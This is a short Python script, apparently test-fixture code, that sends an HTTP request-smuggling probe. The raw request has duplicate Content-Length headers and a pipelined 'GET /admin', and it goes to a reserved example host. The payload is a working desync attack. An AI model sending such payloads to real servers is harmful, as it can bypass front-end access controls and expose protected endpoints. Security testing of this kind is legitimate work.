# Synthetic desync probe for fixture testing: sends a request carrying two
# Content-Length headers followed by a pipelined second request, then reads
# whatever the front end returns. Targets a reserved example host only.
import socket

PAYLOAD = b"POST / HTTP/1.1\r\nHost: target.example.test\r\nContent-Length: 6\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.example.test\r\n\r\n"

with socket.create_connection(("target.example.test", 80), timeout=5) as sock:
    sock.sendall(PAYLOAD)
    print(sock.recv(4096))
